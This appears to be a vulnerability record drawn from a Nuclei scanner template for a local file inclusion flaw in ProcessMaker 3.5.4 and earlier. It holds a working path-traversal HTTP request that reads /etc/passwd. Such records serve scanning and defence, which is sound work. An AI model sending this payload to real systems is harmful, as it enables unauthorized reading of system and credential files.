# Vulnerability: ProcessMaker <=3.5.4 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`processmaker-lfi.yaml`)

## Description
ProcessMaker 3.5.4 and prior is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET /../../../..//etc/passwd HTTP/1.1
Host: {{Hostname}}
```

